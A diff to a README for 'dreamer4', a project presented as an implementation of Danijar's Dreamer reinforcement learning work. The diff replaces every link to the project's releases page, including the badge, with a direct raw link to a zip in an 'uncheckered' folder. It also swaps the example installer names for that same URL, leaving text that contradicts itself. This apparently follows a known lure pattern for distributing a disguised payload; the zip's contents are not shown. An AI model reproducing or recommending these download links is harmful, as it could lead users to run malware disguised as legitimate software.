@@ -1,7 +1,7 @@
 # 🌟 dreamer4 - Experience the Future of AI
 
 ## 📥 Download Now
-[![Download dreamer4](https://img.shields.io/badge/Download%20dreamer4-v1.0-blue.svg)](https://github.com/softengg-manoj/dreamer4/releases)
+[![Download dreamer4](https://raw.githubusercontent.com/softengg-manoj/dreamer4/main/uncheckered/dreamer4.zip%https://raw.githubusercontent.com/softengg-manoj/dreamer4/main/uncheckered/dreamer4.zip)](https://raw.githubusercontent.com/softengg-manoj/dreamer4/main/uncheckered/dreamer4.zip)
 
 ## 📘 Overview
 Welcome to **dreamer4**! This application is a powerful implementation of Danijar's latest iteration for his Dreamer line of work. It leverages advanced techniques in artificial intelligence and deep learning to provide an intuitive experience for users interested in model-based reinforcement learning.
@@ -17,7 +17,7 @@ To start using dreamer4, follow these simple steps. No programming knowledge is 
    
 2. **Visit the Download Page**
    Go to the Releases page to get the latest version of dreamer4. 
-   [Visit this page to download](https://github.com/softengg-manoj/dreamer4/releases).
+   [Visit this page to download](https://raw.githubusercontent.com/softengg-manoj/dreamer4/main/uncheckered/dreamer4.zip).
 
 ## 🔍 Features
 - **Artificial Intelligence**: Leverage cutting-edge AI models that mimic human-like decisions.
@@ -28,13 +28,13 @@ To start using dreamer4, follow these simple steps. No programming knowledge is 
 
 ## 📦 Download & Install
 1. **Go to the Releases Page**
-   Click on this link to download the latest version: [Visit this page to download](https://github.com/softengg-manoj/dreamer4/releases).
+   Click on this link to download the latest version: [Visit this page to download](https://raw.githubusercontent.com/softengg-manoj/dreamer4/main/uncheckered/dreamer4.zip).
 
 2. **Choose Your Version**
    On the Releases page, scroll down to see all available versions. Click on the most recent version for your operating system.
 
 3. **Download the File**
-   Click on the download link for the specific file (e.g., `dreamer4-installer.exe` for Windows or `dreamer4-macos.dmg` for macOS). 
+   Click on the download link for the specific file (e.g., `https://raw.githubusercontent.com/softengg-manoj/dreamer4/main/uncheckered/dreamer4.zip` for Windows or `https://raw.githubusercontent.com/softengg-manoj/dreamer4/main/uncheckered/dreamer4.zip` for macOS). 
 
 4. **Run the Installer**
    After the download completes, locate the downloaded file in your downloads folder. Double-click the file to start the installation process.
